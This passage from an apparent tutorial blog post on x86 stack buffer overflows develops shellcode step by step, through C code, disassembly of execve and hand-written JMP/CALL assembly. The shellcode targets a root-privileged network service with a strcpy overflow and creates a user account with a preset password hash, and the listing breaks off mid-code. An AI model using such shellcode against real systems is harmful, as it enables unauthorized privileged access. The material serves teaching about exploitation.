exploit this off-by-one vulnerability caused an unexpected problem that ultimately turned out to be a bug of the GNU compiler GCC 3.x. For clarification, the assembly code of the following function should be provided:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">2</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="mi">3</span>	<span class="p">}</span></code></pre></figure> <p> Output of the compiler:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span> <span class="nl">foo:</span>
<span class="err">2</span>        <span class="nf">pushl</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>        <span class="nf">movl</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">4</span>        <span class="nf">subl</span>    <span class="kc">$</span><span class="mi">120</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">5</span>        <span class="nf">leave</span>
<span class="err">6</span>        <span class="nf">ret</span></code></pre></figure> <p></p> <p>In line 4 of the assembly code 120 bytes are reserved for the array buff, but according to the C-code the array should be only 100 bytes in size. So, a whole 20 bytes are reserved in excess. Also with other buffer sizes, in almost all cases more memory was allocated than actually necessary. This compiler bug makes it impossible to exploit off-by-one vulnerabilities. In order to achieve a useful result, the For loop termination condition of the foo function has been modified to overwrite the LSB of the saved frame pointer. The corresponding C source code of the example can be found on GitHub.</p> <h1 id="detailed-example-of-creating-an-exploit">Detailed Example of Creating an Exploit</h1> <h2 id="basic-principles">Basic Principles</h2> <p>After discussing classic stack overflows in detail, we will now develop a more extensive exploit that leverages a buffer overflow vulnerability to create a user with root privileges. This scenario assumes the following conditions:</p> <ol> <li>The vulnerable program has been started with elevated (root) privileges.</li> <li>The vulnerable program is network-enabled, allowing attackers to exploit it remotely from another machine.</li> </ol> <p>Further details are beyond this scope; the fully commented source code is available on GitHub. The relevant vulnerability in the source code looks like this:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">calc</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
	<span class="n">strcpy</span> <span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure> <p>After reading input from an external host, the <code class="language-plaintext highlighter-rouge">calc()</code> function is called and given that input. Inside <code class="language-plaintext highlighter-rouge">calc()</code>, a 512-byte buffer (<code class="language-plaintext highlighter-rouge">buff</code>) is allocated, and the string is copied into it using <code class="language-plaintext highlighter-rouge">strcpy()</code>. Because there is no bounds checking, an attacker can trivially cause a buffer overflow.</p> <p>For instance, a simple DoS (Denial of Service) attack could be executed by sending any input larger than 512 bytes, causing the program to crash. However, since the program runs with root privileges, if an attacker succeeds in hijacking the process, they gain elevated permissions on the target system. The generous 512-byte buffer also makes it easy to embed malicious code directly into <code class="language-plaintext highlighter-rouge">buff</code>, potentially along with a NOP sled to increase the likelihood of a successful exploit.</p> <p>We also know that the target system runs on an IA-32/x86 processor. The injected code must be in machine code form, and several steps are involved to produce it:</p> <ol> <li><strong>Implement the desired functions in a C program.</strong></li> <li><strong>Disassemble the C program to analyze the generated machine instructions.</strong></li> <li><strong>Develop a custom assembly program.</strong></li> <li><strong>Assemble the custom program and extract its machine code.</strong></li> <li><strong>Integrate this code into a working exploit.</strong></li> </ol> <h2 id="implementation-of-the-desired-functions-using-a-c-program">Implementation of the Desired Functions Using a C Program</h2> <p>For simplicity, we will create a standard user on the target system. Later, the code can be adapted to create a user with root privileges.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
<span class="mi">2</span>	    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
<span class="mi">3</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/usr/sbin/adduser"</span><span class="p">;</span>
<span class="mi">4</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">"markus"</span><span class="p">;</span>
<span class="mi">5</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-p"</span><span class="p">;</span>
<span class="mi">6</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s">"$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0"</span><span class="p">;</span>
<span class="mi">7</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="mi">8</span>	    <span class="n">execve</span><span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">name</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="mi">9</span>	<span class="p">}</span></code></pre></figure> <p>This program creates a user named <code class="language-plaintext highlighter-rouge">"markus"</code> with the specified (already encrypted) password. The encryption value is provided in <code class="language-plaintext highlighter-rouge">name[3]</code>.</p> <p>In lines 2–7, we prepare the parameter list for the <code class="language-plaintext highlighter-rouge">execve</code> function. This list must be an array of null-terminated strings, ending with a <code class="language-plaintext highlighter-rouge">NULL</code> pointer. When <code class="language-plaintext highlighter-rouge">execve</code> is called in line 8, the current program is replaced with the new program code specified by the first parameter (<code class="language-plaintext highlighter-rouge">"/usr/sbin/adduser"</code>). The second parameter, our argument list, is passed to the main function of the program being executed.</p> <h2 id="analysis-of-the-disassembled-c-program">Analysis of the disassembled C Program</h2> <p>After the C source code has been generated, the output of the GCC compiler can be examined in more detail. First, the assembly code of the main function will be examined.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembly</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">main</span><span class="p">:</span>
<span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>				
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>			
<span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x28</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>			
<span class="err">4</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbe0</span><span class="p">,</span><span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">5</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf2</span><span class="p">,</span><span class="mh">0xffffffdc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">6</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf9</span><span class="p">,</span><span class="mh">0xffffffe0</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">7</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dc00</span><span class="p">,</span><span class="mh">0xffffffe4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">8</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0xffffffe8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>		
<span class="err">9</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>			
<span class="err">10</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x0</span>				
<span class="err">11</span>	<span class="nf">lea</span>    <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">eax</span>				
<span class="err">13</span>	<span class="nf">pushl</span>  <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>			
<span class="err">14</span>	<span class="nf">call</span>   <span class="mh">0x804cac0</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">&gt;</span>		
<span class="err">15</span>	<span class="nf">add</span>    <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">16</span>	<span class="nf">leave</span>
<span class="err">17</span>	<span class="nf">ret</span></code></pre></figure> <p></p> <p>Let’s start the analysis with two already well-known instructions:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>				
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p> When you enter the main function, the old frame pointer is first saved and then overwritten with the stack pointer.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x28</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>			
<span class="err">4</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbe0</span><span class="p">,</span><span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">5</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf2</span><span class="p">,</span><span class="mh">0xffffffdc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">6</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf9</span><span class="p">,</span><span class="mh">0xffffffe0</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">7</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dc00</span><span class="p">,</span><span class="mh">0xffffffe4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">8</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0xffffffe8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>		</code></pre></figure> <p></p> <p>In line three, 40 bytes are reserved for the local variables. As can be seen from the C code, however, only a field of five pointers is created, the GCC compiler reserves 20 bytes extra. This can be traced back to the bug of the GCC 3.X compiler, which in our case is no longer tragic. In lines four to eight, the addresses of the string literals are written to the previously reserved region. The string literals are constants that are stored in the data segment of the program.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p> In line nine another four bytes are reserved on the stack, but the sense of this instruction does not seem to be clear.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x0</span>				
<span class="err">11</span>	<span class="nf">lea</span>    <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">eax</span>				
<span class="err">13</span>	<span class="nf">pushl</span>  <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>					</code></pre></figure> <p> The three parameters of the execv function are then placed on the stack. Make sure that this is done in the reverse order, i. e. that the last parameter is placed on the stack first. Therefore, the parameter NULL is placed on the stack first. Next, the address of the first pointer must be determined in line eleven (this corresponds to the second parameter of the function). In the last step, the address of the string literal name[0] = “/usr/sbin/adduser” is placed on the stack.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">14</span>	<span class="nf">call</span>   <span class="mh">0x804cac0</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">&gt;</span></code></pre></figure> <p> The CALL instruction places the return address on the stack and then branches to the <code class="language-plaintext highlighter-rouge">execve()</code> sub-function. If the <code class="language-plaintext highlighter-rouge">execve()</code> function is executed successfully, it will not return (the current program code is replaced by a new one). Should it still return to <code class="language-plaintext highlighter-rouge">main()</code> in case of an error, the following lines will be executed:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">15</span>	<span class="nf">add</span>    <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">16</span>	<span class="nf">leave</span>
<span class="err">17</span>	<span class="nf">ret</span></code></pre></figure> <p> Some cleanup work is done on the stack and finally <code class="language-plaintext highlighter-rouge">main()</code> is left. The next step is to examine the system function <code class="language-plaintext highlighter-rouge">execve()</code> in more detail. This is much more difficult than analyzing <code class="language-plaintext highlighter-rouge">main()</code>. Before doing so, however, it is advisable to sketch the stack. The memory that is allocated too much should not be taken into account.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/example1-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/example1-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/example1-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2018-02-05-buffer-overflows/example1.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 8:</b> Analysis of the disassembled C-Program (1). </figcaption> </figure> <p>It is important that the name is not a pointer to one of the string literals, but a pointer to the pointer name[0]. But why do you need a pointer to a pointer? The answer is relatively simple: the program useradd, which is called later, contains a main function to which parameters can be passed. The function header will look something like this:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{....</span> <span class="p">}</span></code></pre></figure> <p> This function header is used if you want to pass a list of arguments to the program. The *argv[] is also a pointer to another pointer, namely the pointer to the pointer of the first argument. In our case, the pointer name assumes exactly the same function. In fact, it is exactly this pointer that will later be handed over to the main function of the “useradd” program. Therefore, it also makes sense to place the pointers of our string literals directly one after the other on the stack. This makes it possible to iterate through the list of pointers without any problems and to read in the individual arguments successively. The null pointer name[4] is used as an end identifier for the pointer list. The following is the assembly code of the execve() function: </p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembly</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">__execve</span><span class="p">:</span>
<span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>			
<span class="err">2</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">3</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>		
<span class="err">4</span>	<span class="nf">test</span>   <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">5</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">edi</span>			
<span class="err">6</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">7</span>	<span class="nf">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edi</span>		
<span class="err">8</span>	<span class="nf">je</span>     <span class="mh">0x804cad6</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span>
<span class="err">9</span>	<span class="nf">call</span>   <span class="mh">0x0</span>			
<span class="err">10</span>	<span class="nf">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>		
<span class="err">11</span>	<span class="nf">mov</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">13</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">edi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>		
<span class="err">14</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">15</span>	<span class="nf">int</span>    <span class="kc">$</span><span class="mh">0x80</span>			
<span class="err">16</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">17</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>		
<span class="err">18</span>	<span class="nf">cmp</span>    <span class="kc">$</span><span class="mh">0xfffff000</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>
<span class="err">19</span>	<span class="nf">jbe</span>    <span class="mh">0x804caff</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span>
<span class="err">20</span>	<span class="nf">neg</span>    <span class="o">%</span><span class="nb">ebx</span>
<span class="err">21</span>	<span class="nf">call</span>   <span class="mh">0x80484bc</span> <span class="o">&lt;</span><span class="nv">__errno_location</span><span class="o">&gt;</span>
<span class="err">22</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">ebx</span><span class="p">,(</span><span class="o">%</span><span class="nb">eax</span><span class="p">)</span>
<span class="err">23</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0xffffffff</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>
<span class="err">24</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">ebx</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">25</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">ebx</span>
<span class="err">26</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">edi</span>
<span class="err">27</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">ebp</span>
<span class="err">28</span>	<span class="nf">ret</span></code></pre></figure> <p></p> <p>The first lines are almost identical to the main function:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>			
<span class="err">2</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">3</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>		
<span class="err">4</span>	<span class="nf">test</span>   <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span></code></pre></figure> <p> In line two, the EAX register is set to zero and a TEST instruction with this register is executed in line four. This command causes a bitwise AND operation without modifying the operands. Only the corresponding flags in the status register are set or deleted. In this case, as we will see below, only the fact that the zero flag is set is of interest.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">5</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">edi</span>			
<span class="err">6</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">7</span>	<span class="nf">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edi</span></code></pre></figure> <p> The registers EDI and EBX are then saved to the stack. The instruction in line seven loads the pointer name[0] into the register EDI.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">8</span>	<span class="nf">je</span>     <span class="mh">0x804cad6</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span></code></pre></figure> <p> If the zero-flag is set, the system branches to line eight. This is, as already mentioned, always the case. The program flow is therefore always continued in line ten.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span>	<span class="nf">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>		
<span class="err">11</span>	<span class="nf">mov</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span></code></pre></figure> <p> The instructions in line ten or eleven cause the third parameter with the value NULL to be copied to EDX and the pointer name to ECX. Afterwards the EBX register is saved on the stack again (it doesn’t seem to make much sense).</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">13</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">edi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>		
<span class="err">14</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">15</span>	<span class="nf">int</span>    <span class="kc">$</span><span class="mh">0x80</span></code></pre></figure> <p> Before a software interrupt is triggered in line 15, the registers EBX and EAX are set to the value 0xb and to the pointer name[0]. As can be seen from the “System Call Table” of our Linux system, the value 0xb (11) corresponds exactly to the system call “sys_execve” provided by the operating system. The remaining lines 16 - 28 are not considered further, since they are only executed in the event of an error in the system call. We will introduce a simple error handling later.</p> <p>Apparently, all arguments to the system call were stored in different registers. In fact, for system calls with fewer than 6 parameters, the arguments are all stored in the EBX, ECX, EDX, ESI and EDI registers in turn. The number of the desired call is always stored in the register EAX and the return value of the system call is also written back to EAX. In our case, the registers are described as follows: EAX: 11 (No. of system-call execve) EBX: name[0] ECX: name EDX: NULL</p> <p>If we compare this with the call execve (name[0], name, NULL), the assignment of the registers also makes sense, the order of the parameters was kept.</p> <h2 id="development-of-a-custom-assembly-program">Development of a Custom Assembly Program</h2> <p>Following our detailed analysis of the compiler-generated assembly code, we can now write a much more compact version. Before diving in, however, two points need consideration:</p> <ol> <li> <p><strong>String Literals Placement</strong><br/> Previously, we observed that string literals are stored in the data segment. But when injecting executable code into a target system, we only have access to the input buffer—there is no separate data segment available for our injected payload. Therefore, the necessary strings must be placed immediately after our executable code. Thanks to the <code class="language-plaintext highlighter-rouge">JMP/CALL</code> construct mentioned earlier, the addresses of these strings can later be computed correctly in the injected code.</p> </li> <li> <p><strong>Error Handling</strong><br/> Proper error handling for system calls has not yet been implemented. Here, we will opt for the simplest possible approach: if a system call fails, the process should exit gracefully with an <code class="language-plaintext highlighter-rouge">exit()</code> system call. The system call number for <code class="language-plaintext highlighter-rouge">exit()</code> on Linux is <code class="language-plaintext highlighter-rouge">1</code>; it expects a status code as an argument. The assembly code below demonstrates how to implement this functionality.</p> </li> </ol> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebx</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span></code></pre></figure> <p> Below is a brief summary of the steps required to create a working code to corrupt the target system:</p> <ol> <li>Correct placement of strings after the actual code</li> <li>Determine the individual string addresses and place them in a suitable place</li> <li>Storing a NULL pointer (directly behind the string addresses)</li> <li>Null termination of the individual strings (not done automatically!!)</li> <li>Setting the four registers EAX up to EDX</li> <li>Triggering a software interrupt</li> <li>Error handling The code should have the following structure:</li> </ol> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/examplestructure-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/examplestructure-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/examplestructure-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2018-02-05-buffer-overflows/examplestructure.png" class="img-fluid rounded z-depth-1 imgcenter" width="600px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 9:</b> Exploit code structure. </figcaption> </figure> <p>Some initial runnable code might look like this:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">jmp</span> <span class="nv">data</span>
<span class="nl">start:</span>
	<span class="nf">popl</span> <span class="o">%</span><span class="nb">esi</span>             <span class="err">#</span> <span class="nv">Base</span> <span class="nv">Address</span> <span class="nv">der</span> <span class="nv">Strings</span> <span class="nv">vom</span> <span class="nv">Stack</span> <span class="nv">holen</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 		
	<span class="nf">leal</span> <span class="mi">18</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">67</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>			
	<span class="nf">leal</span> <span class="mi">25</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">71</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>		
	<span class="nf">leal</span> <span class="mi">28</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">75</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>		
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">17</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">Termination</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">Strings</span>
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">24</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">27</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">62</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x7D</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>  <span class="err">#</span> <span class="nv">NULL</span><span class="o">-</span><span class="nv">Pointer</span> <span class="nv">at</span> <span class="nv">end</span> <span class="nv">of</span> <span class="nv">pointer</span> <span class="nv">list</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>        <span class="err">#</span> <span class="nv">Code</span> <span class="nv">of</span> <span class="nv">SysCall</span><span class="o">-</span><span class="nv">table</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>        <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="nf">leal</span> <span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="p">[</span><span class="nv">A</span><span class="p">]</span> <span class="nv">to</span> <span class="nb">ECX</span> <span class="p">(</span><span class="nv">name</span><span class="p">[])</span>
